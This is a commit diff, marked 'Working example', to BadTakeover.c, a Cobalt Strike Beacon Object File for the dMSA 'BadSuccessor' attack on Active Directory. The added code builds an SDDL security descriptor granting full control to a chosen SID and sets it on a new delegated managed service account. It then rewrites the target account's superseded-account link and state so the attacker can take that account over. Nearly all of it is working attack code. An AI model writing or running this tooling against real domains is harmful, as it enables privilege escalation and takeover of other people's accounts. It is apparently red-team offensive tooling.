95726c5dbbda44951c59af842cf5a7056ab0dba3
logangoins <LoganGoins@protonmail.com>
2025-09-26 22:06:47 -0400

    Working example

--- BadTakeover.c
+++ BadTakeover.c
@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <winldap.h>
 #include <winber.h>
-
+#include <sddl.h>
 #include "bofdefs.h"
 #include "beacon.h"
 
@@ -16,6 +16,13 @@ WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods
 WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
 WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);
 
+// advapi32 import for SD conversion
+DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
+    LPCSTR StringSecurityDescriptor,
+    DWORD StringSDRevision,
+    PSECURITY_DESCRIPTOR *SecurityDescriptor,
+    PULONG SecurityDescriptorSize
+);
 
 DECLSPEC_IMPORT char *MSVCRT$strcpy(char *dst, const char *src);
 DECLSPEC_IMPORT char *MSVCRT$strcat(char *dst, const char *src);
@@ -86,11 +93,10 @@ void go(char *args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[+] dNSHostName: %s\n", dnsHostName);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] sAMAccountName: %s\n", samAccountName);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Target object for takeover: %s\n", target);
-
     
     // If you want to add the LDAP entry, uncomment and use:
-    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam, linkAttr, encAttr, uacAttr, state2Attr;
-    LDAPModA *mods[9];
+    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam, linkAttr, encAttr, uacAttr, sdAttr;
+    LDAPModA *mods[10];
 
     char *objectClassVals[] = { "msDS-DelegatedManagedServiceAccount", NULL };
     char *msaStateVals[]    = { "2", NULL };
@@ -100,6 +106,35 @@ void go(char *args, int len) {
     char *linkVals[] = { target, NULL };
     char *encVals[]  = { "28", NULL };   // 0x1c
     char *uacVals[]  = { "4096", NULL }; // 0x1000
+
+    // Binary SD (msDS-GroupMSAMembership)
+
+    char sddl[256];
+    MSVCRT$strcpy(sddl, "O:S-1-5-32-544D:(A;;0xf01ff;;;");
+    MSVCRT$strcat(sddl, access);  // access = SID of target object
+    MSVCRT$strcat(sddl, ")");
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] SDDL value for accessing target object: %s\n", sddl);
+
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    ULONG sdSize = 0;
+
+    rc = ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
+        sddl,
+        SDDL_REVISION_1,
+        &pSD,
+        &sdSize
+    );
+
+    if (rc == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed\n");
+    }
+
+    struct berval sdVal, *sdVals[2];
+    sdVal.bv_len = sdSize;       // previously converted from SDDL
+    sdVal.bv_val = (char*)pSD;
+    sdVals[0] = &sdVal;
+    sdVals[1] = NULL;
 
     modObjectClass.mod_op     = LDAP_MOD_ADD;
     modObjectClass.mod_type   = "objectClass";
@@ -133,6 +168,10 @@ void go(char *args, int len) {
     uacAttr.mod_type   = "userAccountControl";
     uacAttr.mod_values = uacVals;
 
+    sdAttr.mod_op     = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
+    sdAttr.mod_type   = "msDS-GroupMSAMembership";
+    sdAttr.mod_bvalues = sdVals;
+
     mods[0] = &modObjectClass;
     mods[1] = &modMSAState;
     mods[2] = &modInterval;
@@ -142,7 +181,8 @@ void go(char *args, int len) {
     mods[5] = &linkAttr;
     mods[6] = &encAttr;
     mods[7] = &uacAttr;
-    mods[8] = NULL;
+    mods[8] = &sdAttr;
+    mods[9] = NULL;
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to add object: %s\n", childDn);
 
@@ -150,9 +190,37 @@ void go(char *args, int len) {
     if (result != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add entry: %s\n", WLDAP32$ldap_err2string(result));
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added service account: %s\n", dMSAname);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added dMSA object: %s\n", dMSAname);
     }
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to write target object for account takeover\n");
+
+    // Modify the target object to sync the new dMSA
+
+    LDAPMod superSedeAttr, acctStateAttr;
+    LDAPMod *modChanges[3];
+
+    char *superSedeVals[] = { childDn, NULL };
+    char *acctStateVals[] = { "2", NULL }; 
+
+    superSedeAttr.mod_op     = LDAP_MOD_REPLACE;
+    superSedeAttr.mod_type   = "msDS-SupersededManagedAccountLink";
+    superSedeAttr.mod_values = superSedeVals;
+
+    acctStateAttr.mod_op     = LDAP_MOD_REPLACE;
+    acctStateAttr.mod_type   = "msDS-SupersededServiceAccountState";
+    acctStateAttr.mod_values = acctStateVals;
+
+    modChanges[0] = &superSedeAttr;
+    modChanges[1] = &acctStateAttr;
+    modChanges[2] = NULL;
+
+    result = WLDAP32$ldap_modify_s(ld, target, modChanges);
+    if (result != LDAP_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify target object: %s\n", WLDAP32$ldap_err2string(result));
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified target object for takeover: %s\n", target);
+    }
 
 cleanup:
     if (ld != NULL) {
